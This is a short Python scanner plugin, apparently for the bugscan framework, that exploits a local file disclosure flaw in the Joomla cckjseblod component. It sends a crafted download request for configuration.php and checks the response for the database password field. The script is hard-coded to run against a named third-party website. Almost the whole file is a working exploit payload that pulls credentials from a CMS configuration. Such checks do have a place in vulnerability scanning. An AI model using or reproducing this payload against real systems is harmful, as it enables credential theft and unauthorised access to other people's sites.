#!/usr/bin/python
#-*- encoding:utf-8 -*-
# Joomla cckjseblod exploit LFD
#eg:http://www.starmarketingonline.com/index.php
#https://www.bugscan.net/#!/x/22903

def assign(service, arg):
    if service == 'joomla':
        return True, arg


def audit(arg):
    payload = 'index.php?option=com_cckjseblod&task=download&file=configuration.php'
    url = arg + payload
    code, head,res, errcode, _ = curl.curl2(url)
    if code == 200 and 'class JConfig {' in res and '$log_path' in res and '$password' in res:
        security_warning(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('joomla','http://www.starmarketingonline.com/')[1])